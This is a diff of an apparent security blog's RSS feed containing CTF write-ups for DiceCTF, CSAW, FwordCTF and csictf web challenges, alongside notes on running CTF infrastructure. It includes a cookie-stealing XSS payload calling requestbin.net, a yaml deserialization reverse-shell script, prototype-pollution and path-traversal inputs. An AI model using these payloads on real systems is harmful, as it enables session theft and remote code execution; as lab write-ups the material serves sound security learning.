+&lt;p&gt;Note that we can execute our payload because the script-src in CSP is set to &amp;lsquo;self&amp;rsquo;.&lt;/p&gt;
+&lt;p&gt;Finally we have to send the url that opens our panel to the admin in order to execute our gadget &lt;code&gt;https://build-a-better-panel.dicec.tf/create?panelId=kahlaa&lt;/code&gt; .
+And Bingo we received our flag :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/AkvBN7X.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Thank you for reading all the article and sorry if it was a little bit long \o/
+DiceCTF was really fun and a good one to start with after some long break :D Unfortunately I couldn&amp;rsquo;t fully participate but it was also fun to complete the tasks after its end. If you have any questions you can contact me on twitter,facebook or by mail , i&amp;rsquo;ll be very glad to help.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>International CTF Infrastructure Management</title>
@@ -22,7 +446,7 @@
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mw8OoKF.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Cloudflare Stats:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uTuxI3U.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;sections-&#34;&gt;Sections&lt;/h2&gt;
+&lt;h2 id=&#34;sections&#34;&gt;Sections&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;Platform Infrastructure&lt;/li&gt;
 &lt;li&gt;Issues We faced&lt;/li&gt;
@@ -30,7 +454,7 @@
 &lt;li&gt;Isolated Container for each participant in Bash category&lt;/li&gt;
 &lt;li&gt;Next edition ?&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;platform-infrastructure-&#34;&gt;Platform Infrastructure&lt;/h2&gt;
+&lt;h2 id=&#34;platform-infrastructure&#34;&gt;Platform Infrastructure&lt;/h2&gt;
 &lt;p&gt;We have mainly used AWS services, there is no special reason for this choice but I was more familiar with AWS and every member in our team had free 100$ credits in AWS Educate xD
 For impatient people here is the global architecture we used at the beginning of the CTF, it was the ideal choice for us but we faced some problems that obliged us to switch to an another alternative.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/OFQnrbj.jpg&#34; alt=&#34;PLATFORM&#34;&gt;&lt;/p&gt;
@@ -66,18 +490,18 @@ For impatient people here is the global architecture we used at the beginning of
 &lt;p&gt;We used docker swarm for orchestration and it was really helpful , we created 4 replicas in each node ( learn more about Docker Swarm 
 &lt;a href=&#34;https://www.ionos.fr/digitalguide/serveur/know-how/docker-orchestration-avec-swarm-et-compose/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt; ) but after some time we decided to change our strategy , docker swarm had a weakness which is sharing &lt;strong&gt;volumes&lt;/strong&gt; ; every volume mount is local to that node, this was not something critical and there are some solutions available but as it was something unpredictable for us and we didn&amp;rsquo;t test it before, we decided to choose the safest option and replaced the 4 CTFD instances with a single t2.xlarge instance ( &lt;strong&gt;16GB Memory/4 Vcpus&lt;/strong&gt; ) that contains also 4 replicas of CTFD . The result is the following:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WVm0KA5.jpg&#34; alt=&#34;ARCH&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;issues-we-faced-&#34;&gt;Issues We faced&lt;/h2&gt;
-&lt;h3 id=&#34;aws-rds-&#34;&gt;AWS RDS&lt;/h3&gt;
+&lt;h2 id=&#34;issues-we-faced&#34;&gt;Issues We faced&lt;/h2&gt;
+&lt;h3 id=&#34;aws-rds&#34;&gt;AWS RDS&lt;/h3&gt;
 &lt;p&gt;We are really thankful that this error occured 5 days before the CTF. Only 1 hour after the we launched the platform, we kept having internal server errors , after some debugging we discovered AWS RDS (mysql DBs in general) has an attribute &lt;strong&gt;max_connections&lt;/strong&gt; which is set by default to a low value and once we exceeded that value CTFD couldn&amp;rsquo;t connect to the database, but after changing the max_connections value and restarting things we kept having the 500 internal errors :( . After a lot of debugging and analysis I discovered that the containers couldn&amp;rsquo;t resolve the database domain name which is really strange because AWS DNS server was running flawlessly. To make things shorter, docker swarm overlay network&amp;rsquo;s IP range was overlapping with the physical network, so when the container try to resolve the DB domain name it didn&amp;rsquo;t really send a request to AWS DNS , the solution was to launch the swarm with the following command:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo docker swarm init --default-addr-pool 192.168.0.0/16
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;it took us only 35 minutes to discover the problem and solve it, but it was the most stressful minutes in my life xD&lt;/p&gt;
-&lt;h3 id=&#34;common-problems-&#34;&gt;Common problems&lt;/h3&gt;
+&lt;h3 id=&#34;common-problems&#34;&gt;Common problems&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;Docker Swarm sticky sessions&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Docker swarm doesn&amp;rsquo;t have by default a layer 7  load balancer , so we had faced some problems related to sessions, the solution was easy, we only needed to add our own load balancer that supports sticky sessions (we used traefik instead of nginx and it did really great )&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Other Issues&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;I needed to set &lt;strong&gt;SQLALCHEMY_MAX_OVERFLOW&lt;/strong&gt; in CTFD to a high value in order to avoid some DB problems and I also had to add some code to CTFD in order to connect successfully to my S3 bucket (AWS Educate accounts have an extra parameter that need to be used and CTFD doesn&amp;rsquo;t handle this case).&lt;/p&gt;
-&lt;h2 id=&#34;challenges-management-and-health-check-&#34;&gt;Challenges Management and health check&lt;/h2&gt;
+&lt;h2 id=&#34;challenges-management-and-health-check&#34;&gt;Challenges Management and health check&lt;/h2&gt;
 &lt;p&gt;For Web tasks every framework needs a custom docker-compose.yml file so every author took care of his task.
 For the other categories we used a t2.medium instance for each task and docker swarm to orchestrate the containers ( each task has 3 replicas) and to make sure that we will have no down time (if a container failed there is always two other containers running). this is an automated version where you only have to create a Dockerfile for the task (take a look at my github repo for examples):&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt;&lt;/p&gt;
@@ -131,13 +555,13 @@ fi
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; In case you faced any errors you have to leave the swarm and retry again (don&amp;rsquo;t forget to use the last version of docker-compose)&lt;/p&gt;
 &lt;p&gt;This was a quick solution to facilitate things during the CTF and it may be optimized, in fact I&amp;rsquo;m thinking of releasing a tool that do everything for us but I&amp;rsquo;m just too lazy.&lt;/p&gt;
-&lt;h3 id=&#34;mangement-&#34;&gt;Mangement:&lt;/h3&gt;
+&lt;h3 id=&#34;mangement&#34;&gt;Mangement:&lt;/h3&gt;
 &lt;p&gt;Some of you may be wondering how we could manage more than 22 servers, we used an awesome tool called &lt;strong&gt;
 &lt;a href=&#34;https://termius.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Termius&lt;/a&gt;&lt;/strong&gt; (it&amp;rsquo;s free in Github Student Pack) which is an SSH client with a lot of awesome features, it lets you organize the servers in groups and ssh to them with just a double click.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/PFWeLl2.png&#34; alt=&#34;TERMIUS&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Platform:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/6KvLoHv.png&#34; alt=&#34;TERMIUS&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;isolated-container-for-each-participant-in-bash-category-&#34;&gt;Isolated Container for each participant in Bash category&lt;/h2&gt;
+&lt;h2 id=&#34;isolated-container-for-each-participant-in-bash-category&#34;&gt;Isolated Container for each participant in Bash category&lt;/h2&gt;
 &lt;p&gt;I think that many people are waiting for this section, in bash category there were some tasks that required an SSH connection so to provide a better environment we came up with this solution and every player will be assigned to an isolated container.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Technical details:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;The idea is simple, we firstly instanciate a manager which is a container running the SSH server and for each connection it will instanciates a new container (from the image of the task) and connects to it (docker inside docker).&lt;/p&gt;
@@ -149,9 +573,9 @@ fi
 &lt;li&gt;Run &lt;code&gt;docker-compose -f docker-compose.yml up&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;And Bingo you will have SSH listening on port 10000, you can create a cron job to kill the participants containers every period of time or optimize manage.sh script. Please feel free to contact me if you have any questions or optimizations.&lt;/p&gt;
-&lt;h2 id=&#34;next-edition--&#34;&gt;Next edition ?&lt;/h2&gt;
+&lt;h2 id=&#34;next-edition-&#34;&gt;Next edition ?&lt;/h2&gt;
 &lt;p&gt;Personally, I prefer using kubernetes in the next edition and automate health checks for each task. Finding a solution to enable a separate environment for every participant in all categories is also a nice idea and finally develop our custom platform.&lt;/p&gt;
-&lt;h2 id=&#34;conclusion-&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;I&amp;rsquo;m so happy this edition was concluded successfully and we got great feedbacks, I have definitely learned a lot from this opportunity, can&amp;rsquo;t wait for the next edition ; it will be  more exciting !!
 For any questions you can contact me on twitter or facebook!&lt;/p&gt;
 </description>
@@ -162,14 +586,14 @@ For any questions you can contact me on twitter or facebook!&lt;/p&gt;
       <link>https://ahmed-belkahla.me/post/csaw2020-webrtc/</link>
       <pubDate>Mon, 14 Sep 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/csaw2020-webrtc/</guid>
-      <description>&lt;h1 id=&#34;web-rtc-450pts-39-solves-&#34;&gt;Web RTC (450pts) 39 solves&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;web-rtc-450pts-39-solves&#34;&gt;Web RTC (450pts) 39 solves&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/KJrEEZl.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Last weekend,we have been a part  of the CSAW CTF 2020 and our team Fword ranked 4th in MENA region.
 We managed to solve all web challenges with my awesome teammates 
 &lt;a href=&#34;https://twitter.com/Hera14165735&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@Hera&lt;/a&gt; and 
 &lt;a href=&#34;https://twitter.com/BahaBaghdadi&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@Noxious&lt;/a&gt; and we have particularly enjoyed &lt;strong&gt;Web RTC&lt;/strong&gt; .&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/X0z8wys.png&#34; alt=&#34;SCOREBOARD&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;tldl-&#34;&gt;TL;DL&lt;/h2&gt;
+&lt;h2 id=&#34;tldl&#34;&gt;TL;DL&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Exploiting CoTurn server in order to gain SSRF.&lt;/p&gt;
@@ -178,13 +602,13 @@ We managed to solve all web challenges with my awesome teammates
 &lt;p&gt;Escalating SSRF to RCE using Redis.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;overview-&#34;&gt;Overview&lt;/h2&gt;
+&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
 &lt;p&gt;We have a Real Time Chat web app and we were provided with the source code / Dockerfile / supervisor.conf.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/cBI0d2H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Examining the source code didn&amp;rsquo;t really bring something to the table.But we got some juicy stuff ,reading the Dockerfile / supervisor.conf.
 It turned out that the application is using TURN protocol to relay the network traffic between peers and Redis as a caching system.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/thalPtZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
 &lt;p&gt;Since the application didn&amp;rsquo;t seem vulnreable, we decide to focus basically on CoTURN server exploitation.
 After searching around we found the following 
 &lt;a href=&#34;https://hackerone.com/reports/333419&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HackerOne report&lt;/a&gt; which claims that it&amp;rsquo;s possible to abuse the TURN Protocol to gain SSRF. In fact,
@@ -201,7 +625,7 @@ using &lt;strong&gt;0.0.0.0&lt;/strong&gt; ip:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/zQYbXit.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/gAqT0pL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And Bingo we achieved the first part!&lt;/p&gt;
-&lt;h3 id=&#34;escalating-ssrf-to-rce-using-redis-&#34;&gt;Escalating SSRF to RCE using Redis&lt;/h3&gt;
+&lt;h3 id=&#34;escalating-ssrf-to-rce-using-redis&#34;&gt;Escalating SSRF to RCE using Redis&lt;/h3&gt;
 &lt;p&gt;This part was somehow trivial but it took us some time to exploit Redis properly, we used  some instructions from this &lt;strong&gt;
 &lt;a href=&#34;https://github.com/jas502n/Redis-RCE&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tool&lt;/a&gt;&lt;/strong&gt; ( we fired a Rogue server from it) and executed the following commands:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jUFM1jt.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -228,17 +652,17 @@ using &lt;strong&gt;0.0.0.0&lt;/strong&gt; ip:&lt;/p&gt;
       <description>&lt;p&gt;Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I&amp;rsquo;ve been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to  deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mw8OoKF.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
 &lt;p&gt;However in this article we will discuss the possible ways of solving my Web / Bash tasks.&lt;/p&gt;
-&lt;h2 id=&#34;pastaxss-5-solves-500pts-&#34;&gt;PastaXSS (5 solves) 500pts&lt;/h2&gt;
+&lt;h2 id=&#34;pastaxss-5-solves-500pts&#34;&gt;PastaXSS (5 solves) 500pts&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/F4BHxkK.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).&lt;/p&gt;
-&lt;h3 id=&#34;enumeration-&#34;&gt;Enumeration&lt;/h3&gt;
+&lt;h3 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h3&gt;
 &lt;p&gt;When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a &lt;strong&gt;jutsu&lt;/strong&gt; with markdown possibility.
 There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts
 &lt;code&gt;http://web1.fword.wtf/jutsu/{id}&lt;/code&gt; .&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/XY4Rj5I.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Markdown in jutsu:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/mUvo0j4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
 &lt;p&gt;Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;JutsusController.php&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
@@ -298,7 +722,7 @@ the SSRF to communicate with Redis caching system ( you can know from the config
 &lt;p&gt;&lt;strong&gt;FwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;There was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;![&amp;lt;img src=&amp;quot;#&amp;quot; onerror=&amp;quot;src=&#39;http://requestbin.net/r/12bfihl1?c=&#39;+document.cookie; this.onerror=null&amp;quot;/&amp;gt;](#){onerror=outerHTML=alt}&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;useless3-solves-500pts-&#34;&gt;Useless(3 solves) 500pts&lt;/h2&gt;
+&lt;h2 id=&#34;useless3-solves-500pts&#34;&gt;Useless(3 solves) 500pts&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/r0HTsK7.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don&amp;rsquo;t see anything special.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/O60WJr5.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -337,7 +761,7 @@ def github_oauth(github_authbp,token):
 &lt;p&gt;The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that &lt;strong&gt;fwordadmin&lt;/strong&gt; is the github account of the admin (this information will help us next).&lt;/p&gt;
 &lt;p&gt;Now our goal is to login using fwordadmin account, there&amp;rsquo;s something suspicious in the previous code, when you connect via github you don&amp;rsquo;t need any password but indeed the user is still
 saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).&lt;/p&gt;
-&lt;p&gt;The User class confirms our statement, the default password is set to &amp;quot;&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;The User class confirms our statement, the default password is set to &amp;quot;&amp;quot;&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class User(UserMixin,Base):
     __tablename__ = &#39;users&#39;
     id = Column(Integer, primary_key=True)
@@ -357,7 +781,7 @@ saved in the same table where regular registrations are stored so we have to won
 &lt;pre&gt;&lt;code&gt;login: fwordadmin
 password: //
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;There is a check that removes special characters so the password will be interpreted as &amp;quot;&amp;rdquo; at the end.&lt;/p&gt;
+&lt;p&gt;There is a check that removes special characters so the password will be interpreted as &amp;quot;&amp;quot; at the end.&lt;/p&gt;
 &lt;p&gt;Now we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.&lt;/p&gt;
 &lt;p&gt;The vulnerable code:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def parse(text):
@@ -388,7 +812,7 @@ print(&amp;quot;[+] Shell Spawned, check your listener)
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .&lt;/p&gt;
-&lt;h2 id=&#34;otaku-8-solves-500pts-&#34;&gt;Otaku (8 solves) 500pts&lt;/h2&gt;
+&lt;h2 id=&#34;otaku-8-solves-500pts&#34;&gt;Otaku (8 solves) 500pts&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/GduvVgP.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/4IZ3mAW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -448,7 +872,7 @@ newUser[&amp;quot;isAdmin&amp;quot;]=0;
 &lt;p&gt;Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype
 pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;brrr&amp;rdquo;,&amp;rdquo;   &lt;strong&gt;proto&lt;/strong&gt;&amp;rdquo; : {&amp;ldquo;isAdmin&amp;rdquo;:1}, &amp;ldquo;aaaa&amp;rdquo;:&amp;ldquo;aaa&lt;/p&gt;
+&lt;p&gt;brrr&amp;quot;,&amp;quot;   &lt;strong&gt;proto&lt;/strong&gt;&amp;quot; : {&amp;ldquo;isAdmin&amp;rdquo;:1}, &amp;ldquo;aaaa&amp;rdquo;:&amp;ldquo;aaa&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;W don&amp;rsquo;t have to forget the whitespace before &lt;code&gt;__proto__&lt;/code&gt; because mongo doesn&amp;rsquo;t accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.&lt;/p&gt;
 &lt;p&gt;Now we have admin access:&lt;/p&gt;
@@ -465,12 +889,12 @@ path: /proc/self/environ
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;And Bingo we got our flag&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/DNO9m4H.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;other-writeups-&#34;&gt;Other Writeups&lt;/h3&gt;
+&lt;h3 id=&#34;other-writeups&#34;&gt;Other Writeups&lt;/h3&gt;
 &lt;p&gt;Super Guesser Team writeups, they solved all web challenges :D 
 &lt;a href=&#34;https://github.com/Super-Guesser/ctf/tree/master/Fword%20CTF%202020/writeups&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Hexion Team Otaku task writeup 
 &lt;a href=&#34;https://github.com/om3r-v/CTF-solutions/tree/master/FwordCTF/otaku&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;bash-category-&#34;&gt;Bash Category&lt;/h2&gt;
+&lt;h2 id=&#34;bash-category&#34;&gt;Bash Category&lt;/h2&gt;
 &lt;p&gt;These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i&amp;rsquo;ll put some links here (I&amp;rsquo;m just lazy to write my own writeups):&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;JailBoss:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;
@@ -487,7 +911,7 @@ path: /proc/self/environ
 &lt;a href=&#34;https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/BashIsFun/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;
 &lt;a href=&#34;https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---bash-is-fun&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;source-code-&#34;&gt;Source Code&lt;/h2&gt;
+&lt;h2 id=&#34;source-code&#34;&gt;Source Code&lt;/h2&gt;
 &lt;p&gt;You can visit this github repo where i&amp;rsquo;ll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )&lt;/p&gt;
 &lt;p&gt;
 &lt;a href=&#34;https://github.com/kahla-sec/FwordCTF-2020&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;FwordCTF 2020&lt;/a&gt;&lt;/p&gt;
@@ -501,7 +925,7 @@ path: /proc/self/environ
       <pubDate>Tue, 21 Jul 2020 08:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/csictf2020/</guid>
       <description>&lt;p&gt;After a long week of work I decided to participate in CSICTF2k20 with my team Fword since I didn&amp;rsquo;t participate for a long time :( We were among the top 30 teams and we managed to almost solve all Web exploitaion tasks with my teammate @Hera. However I enjoyed solving File Library and The Usual Suspects tasks.&lt;/p&gt;
-&lt;h1 id=&#34;file-library-497pts-40-solves-&#34;&gt;File Library 497pts (40 solves)&lt;/h1&gt;
+&lt;h1 id=&#34;file-library-497pts-40-solves&#34;&gt;File Library 497pts (40 solves)&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/IRJZKbM.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We are given the source code of the task :&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const express = require(&#39;express&#39;);
@@ -574,17 +998,17 @@ console.log(&amp;quot;format inside allowedfile is: &amp;quot;+format);
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;I added some logging statements to facilitate things, as you can see when we visit &lt;strong&gt;/getfile&lt;/strong&gt; we can provide in a get parameter a filename that will be displayed for us but there are some restrictions,
-we can&amp;rsquo;t use whitespaces or &amp;ldquo;/&amp;quot;, there are only four extensions that are allowed (js|ts|c|cpp) .&lt;/p&gt;
+we can&amp;rsquo;t use whitespaces or &amp;ldquo;/&amp;rdquo;, there are only four extensions that are allowed (js|ts|c|cpp) .&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/ClTfqlL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;After reading carefully the source code, I was pretty sure that we will use http parameters pollution because there is no check concerning the type of get parameters so we can enter an array and try to exploit the misbehaviour that may occur.&lt;/p&gt;
 &lt;p&gt;Let&amp;rsquo;s imagine that we enter the following array :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;rdquo;,&amp;quot;.&amp;quot;,&amp;ldquo;js&amp;rdquo;]&lt;/p&gt;
+&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;quot;,&amp;quot;.&amp;quot;,&amp;ldquo;js&amp;rdquo;]&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;1st Check&lt;/strong&gt; : &lt;code&gt;if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;))&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;When includes is applied to an array it will check if there&amp;rsquo;s a field that is equal to the passed parameter (&amp;rdquo; &amp;quot; and &amp;ldquo;/&amp;rdquo; in our case) which is false here so we can successfully pass this check&lt;/p&gt;
+&lt;p&gt;When includes is applied to an array it will check if there&amp;rsquo;s a field that is equal to the passed parameter (&amp;quot; &amp;quot; and &amp;ldquo;/&amp;rdquo; in our case) which is false here so we can successfully pass this check&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;2nd Check&lt;/strong&gt; : &lt;code&gt;if (!allowedFileType(file))&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -608,7 +1032,7 @@ const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;so our array will become:&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;rdquo;]&lt;/p&gt;
+&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;quot;]&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;And finally after resolving the path returnedFile will contain /proc/self/cwd/flag.txt&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
@@ -619,13 +1043,13 @@ const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/sdvZ1eL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;It was a really nice task so thanks to the author!&lt;/p&gt;
-&lt;h1 id=&#34;the-usual-suspects-499pts-32-solves-&#34;&gt;The Usual Suspects 499pts (32 solves)&lt;/h1&gt;
+&lt;h1 id=&#34;the-usual-suspects-499pts-32-solves&#34;&gt;The Usual Suspects 499pts (32 solves)&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/qorhTCy.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
